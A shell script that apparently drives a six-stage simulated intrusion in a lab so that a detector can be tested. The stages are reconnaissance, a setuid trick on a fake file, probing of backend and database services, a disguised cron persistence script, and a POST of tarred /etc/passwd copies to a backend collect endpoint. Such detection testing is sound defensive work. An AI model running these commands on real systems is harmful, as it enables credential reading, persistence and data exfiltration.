#!/bin/sh

run() {
    printf '\n$ %s\n' "$*"
    sh -c "$*" || true
}

stage() {
    printf '\n========== Stage %s: %s ==========\n' "$1" "$2"
}

stage 1 "Shell Entry"
run "bash -lc 'echo shell-entry'"
run "sh -c 'echo shell-entry-sh'"

stage 2 "Reconnaissance"
run "hostname"
run "pwd"
run "whoami"
run "id"
run "env | head"
run "cat /etc/os-release"
run "cat /etc/passwd >/dev/null"
run "ls -la /"
run "ps aux"

stage 3 "Privilege Escalation Simulation"
run "cat /proc/1/status >/dev/null"
run "cat /proc/self/status >/dev/null"
run "find / -perm -4000 -type f 2>/dev/null | head"
run "mount | head"
run "touch /tmp/fake-suid"
run "chmod 4755 /tmp/fake-suid"
run "ls -l /tmp/fake-suid"

stage 4 "Lateral Movement"
run "curl -s http://backend:5000/"
run "curl -s http://backend:5000/secret"
run "curl -s http://frontend/ >/dev/null"
run "nc -vz backend 5000"
run "nc -vz database 5432"

stage 5 "Persistence Simulation"
run "mkdir -p /tmp/.persist /tmp/cron"
run "printf '#!/bin/sh\\necho System Update\\n' > /tmp/update.sh"
run "chmod 755 /tmp/update.sh"
run "printf '* * * * * /tmp/update.sh\\n' > /tmp/cron/root"
run "ls -la /tmp/.persist /tmp/cron /tmp/update.sh"

stage 6 "Data Exfiltration Simulation"
run "mkdir -p /tmp/data"
run "cp /etc/passwd /tmp/data/passwd.copy"
run "cp /etc/os-release /tmp/data/os-release.copy"
run "tar -czf /tmp/demo-data.tar.gz -C /tmp data"
run "ls -lh /tmp/demo-data.tar.gz"
run "curl -s -X POST --data-binary @/tmp/demo-data.tar.gz http://backend:5000/collect"

printf '\nAttack sequence complete. Expected detector result: 6/6 stages.\n'
